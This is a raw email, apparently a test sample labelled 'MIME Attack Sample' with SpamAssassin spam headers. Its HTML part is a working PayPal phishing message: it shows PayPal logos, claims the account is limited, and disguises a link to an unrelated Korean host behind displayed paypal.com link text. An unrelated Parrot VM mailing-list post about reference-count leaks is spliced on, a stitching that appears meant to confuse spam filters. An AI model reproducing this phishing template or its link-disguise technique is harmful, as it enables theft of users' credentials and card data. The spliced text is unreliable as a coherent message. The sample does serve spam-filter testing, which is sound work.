From: 	Finnels-Neal, La Donna  
To: email2252@speedy.uwaterloo.ca
Subject: MIME Attack Sample
Content-Type: multipart/mixed; boundary="BOUNDARY"
--BOUNDARY
>
Content-Type: text/html
X-Spam-Flag: YES
X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
X-Spam-Level: ********
X-Spam-Status: Yes, score=8.7 required=5.0 tests=HTML_MESSAGE,
	HTML_NONELEMENT_00_10,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,
	NO_REAL_NAME,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,RCVD_IN_DSBL,
	RCVD_IN_XBL autolearn=no version=3.0.2
X-Spam-Report: 
	*  0.0 NO_REAL_NAME From: does not include a real name
	*  0.0 HTML_MESSAGE BODY: HTML included in message
	*  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
	*      [cf: 100]
	*  0.0 HTML_NONELEMENT_00_10 BODY: 0% to 10% of HTML elements are non-standard
	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
	*  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
	*  3.8 RCVD_IN_DSBL RBL: Received via a relay in list.dsbl.org
	*      [<http://dsbl.org/listing?203.237.221.43>]
	*  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
	*      [203.237.221.43 listed in sbl-xbl.spamhaus.org]
	*  0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME headers
Status: RO
X-Status: 
X-Keywords:                 
X-UID: 191


<html>
<head>
<style type="text/css">
#message .notified {}
#message, #message TD {font-family: verdana,arial,helvetica,sans-serif;font-size:
12px;color: #000000;}
#message LI {line-height: 120%;}
#message UL.ppsmallborder {margin:10px 5px 10px 20px;}
#message LI.ppsmallborderli {margin:0px 0px 5px 0px;}
#message UL.pp_narrow {margin:10px 5px 0px 40px;}
#message hr.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left:
#fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
#message .pp_label {font-family: verdana,arial,helvetica,sans-serif;font-size:
10px;font-weight: bold;color: #000000;}
#message .pp_serifbig {font-family: serif;font-size: 20px;font-weight: bold;color:
#000000;}
#message .pp_serif{font-family: serif;font-size: 16px;color: #000000;}
#message .pp_sansserif{font-family: verdana,arial,helvetica,sans-serif; font-size:
16px;color: #000000;}
#message .pp_heading {font-family: verdana,arial,helvetica,sans-serif;font-size:
18px;font-weight: bold;color: #003366;}	
#message .pp_subheadingeoa {font-family:
verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color:
#000000;}	
#message .pp_subheading {font-family: verdana,arial,helvetica,sans-serif;font-size:
16px;font-weight: bold;color: #003366;}	
#message .pp_sidebartext {font-family: verdana,arial,helvetica,sans-serif;font-size:
11px;color: #003366;}	
#message .pp_sidebartextbold {font-family:
verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color:
#003366;}	
#message .pp_footer {font-family: verdana,arial,helvetica,sans-serif;font-size:
11px;color: #aaaaaa;}
#message .pp_button {font-size: 13px; font-family:
verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset;
color:#000000; background-color: #cccccc;}
#message .pp_smaller {font-family: verdana,arial,helvetica,sans-serif;font-size:
10px;color: #000000;}
#message .pp_smallersidebar {font-family:
verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
#message .ppem106 {font-weight: 700;}
</style>
</head>
<xbody bgcolor="#ffffff">
<table width="600" cellspacing="0" cellpadding="0" border="0"
align="center">
	<tr valign="top">
		<td>
        <p align="center"><font face="Verdana" style="font-size: 9pt"><A 
target="_blank" 
href="http://www.enesco.co.kr/cgi_bin/webscr=cmd=_home/" 
><IMG
src="http://images.paypal.com/en_US/i/logo/email_logo.gif"  alt="PayPal"
border="0" width="255" height="35"></A> </font>
		</td>
	</tr>
</table>
<div align="center">
  <center>
<table width="750" cellspacing="0" cellpadding="0" border="0" height="316" style="border-collapse: collapse" bordercolor="#111111">
<tr>
	<td background="http://images.paypal.com/images/bg_clk.gif" 
width=750 height="29"><font face="Verdana" style="font-size: 9pt"><img src="http://images.paypal.com/images/pixel.gif"  height="29"
width="1" border="0"></font></td>
</tr>	
<tr>
	<td height="287" width="750"><font face="Verdana" style="font-size: 9pt"><b><img src="http://images.paypal.com/images/pixel.gif"  height="10"
width="1" border="0"></b>PayPal is committed to maintaining a safe environment for 
    its community of customers. To protect the security of your account, PayPal 
    employs some of the most advanced security systems in the world and our 
    anti-fraud teams regularly screen the PayPal system for unusual activity.
    <br>
    <br>
    We are contacting you because on 2 January 2006 our Account 
Review 
    Team identified some unusual activity in your account. In accordance with 
    PayPal's User Agreement and to ensure that your account has not been 
    compromised, access to your account was limited. Your account access will 
    remain limited until this issue has been resolved.<br>
    <br>
    To secure your account and quickly restore full access, we may require some 
    additional information from you for the following reason:<br>
    <br>
    We have been notified that a card associated with your account has been 
    reported as lost or stolen, or that there were additional problems with your 
    card.<br>
    <br>
    <br>
    This process is mandatory, and if not completed within the nearest time your 
    account or credit card may be subject for temporary suspension. <br>
    <br>
    To securely confirm your PayPal information please click on the link bellow:<br>
    <br>
    <br>
    <br>
    <a 
href="http://www.enesco.co.kr/cgi_bin/webscr=cmd=_home/" 
target="_blank"><b>https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</b></a><b><br>
    <br>
    <br>
    <br>
    </b>We encourage you to log in and perform the steps necessary to restore your 
    account access as soon as possible. Allowing your account access to remain 
    limited for an extended period of time may result in further limitations on 
    the use of your account and possible account closure.<br>
    <br>
    For more information about how to protect your account please visit PayPal 
    Security Center. We apologize for any incovenience this may cause, and we 
    apriciate your assistance in helping us to maintain the integrity of the 
    entire PayPal system.<br>
    <br>
    <br>
    <br>
    Thank you for using PayPal!<br>
    The PayPal Team<br>
&nbsp;</font></td>
</tr>
</table>
  </center>
</div>
</xbody>   
</html>
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
Content-Type: text/plain
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Bram Geron wrote:
> The patch in <parrot.solution1.patch> fixes the problem for me.

I realized that contexts currently initially have a ref_count of 0, if
they're not used as :outer targets for other subs. So in 'normal'
situations, the caller's context's ref_count now drops from 0 to -1 in a
tail call, and since -1 != 0 the caller's context will never be freed,
resulting in a memory leak. Attached <parrot.solution1.updated.patch>
should fix that.

Still, I'm left with a question. How can we DOD a closure? To me it
seems that once a closure exists, it references its context. Often the
context is still left in a register, so the context references the
closure PMC, which in turn references the closure. Because we use
reference counting in these cases, no count ever drops to zero, and they
all live forever.

Sorry for the extra disturbance, thanks for looking at my mail,
- --
Bram Geron | GPG 0xE7B9E65E
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.6 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFGUKbOvquQbee55l4RAp5wAJ0czwrfQc5Ta/xtMn7FqhSeptq/awCfbNg2
FxMZOHymYqUQCNoyK54pBmo=
=bjro
-----END PGP SIGNATURE-----
-BOUNDARY--
